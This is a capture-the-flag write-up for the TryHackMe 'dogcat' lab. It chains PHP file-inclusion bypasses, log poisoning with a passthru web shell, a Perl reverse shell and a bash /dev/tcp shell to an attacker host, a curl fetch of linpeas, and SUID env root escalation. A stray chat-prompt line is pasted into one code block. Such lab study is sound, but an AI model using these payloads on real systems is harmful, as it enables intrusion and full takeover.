# Link
- https://tryhackme.com/room/dogcat

# Info

## IP = $IP
# Ports

## Port Scanning
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 22
### `nmap`
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)
|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)
|_  256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)
```

## 80

### `nmap`
```
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```
### Exploring
- query-param is strange...

### Exploiting query-param
- must have 'cat' or 'dog' string
- Error
```
GET /?view=cat'admin 

<b>Warning</b>:  include(): Failed opening 'cat'admin.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php
```
- PHP Wrappers?
    - https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
- cat%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd with dot truncation?
    - https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers
- Got the base64 for any php file!
    - `php://filter/convert.base64-encode/resource==cat/../index`
- Reading `index.php`, I got a interesting part:
```
User
Cite apenas o que esta parte faz:

 <?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```
- Creating a `ext` parameter in URL
    - I CAN READ ANY FILE =D
- Reading `/etc/passwd`
- Log poisoning
    - https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
```bash
┌──(kali㉿kali)-[~]
└─$ nc $IP 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
HTTP/1.1 400 Bad Request
Date: Sun, 25 Feb 2024 20:59:43 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 172.17.0.2 Port 80</address>
</body></html>
```
```
GET /?view=cat%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log&ext=&cmd=ls HTTP/1.1
Host: $IP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://$IP/
Upgrade-Insecure-Requests: 1
```
- Verifying the binaries, I found `perl`. Trying rev-shell with it
- view: `../../../../cat/../var/log/apache2/access.log`
- cmd: `perl -e 'use Socket;$i="$ATK_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`
```
GET /?view=..%2f..%2f..%2f..%2fcat%2f..%2fvar%2flog%2fapache2%2faccess.log&ext=&cmd=perl%20-e%20'use%20Socket%3b%24i%3d%22$ATK_IP%22%3b%24p%3d1234%3bsocket(S%2cPF_INET%2cSOCK_STREAM%2cgetprotobyname(%22tcp%22))%3bif(connect(S%2csockaddr_in(%24p%2cinet_aton(%24i))))%7bopen(STDIN%2c%22%3e%26S%22)%3bopen(STDOUT%2c%22%3e%26S%22)%3bopen(STDERR%2c%22%3e%26S%22)%3bexec(%22%2fbin%2fsh%20-i%22)%3b%7d%3b' HTTP/1.1
Host: $IP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://$IP/
Upgrade-Insecure-Requests: 1
```

# PrivEsc

## LinPeas
```bash
curl -O http://$ATK_IP:8000/linpeas.sh
```

## First flag
- _/var/www/html/flag.php_

## Second flag
- _/var/www/flag2\_QMW7JvaY2LvK.txt_

## SUID permissions on `env`
- https://gtfobins.github.io/gtfobins/env/#suid
```bash
$ env /bin/bash -p
whoami
root
```

## Interesting file
```bash
cat /opt/backups/backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

## Trasnforming this file into a rev shell
```bash
cd backups
echo "#!/bin/bash" > backup.sh
echo "bash -i >& /dev/tcp/$ATK_IP/1337 0>&1" >> backup.sh
cat backup.sh
#!/bin/bash
bash -i >& /dev/tcp/$ATK_IP/1337 0>&1
```

## Waiting for execution of _backup.sh_
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [$ATK_IP] from (UNKNOWN) [$IP] 51154
bash: cannot set terminal process group (2545): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
```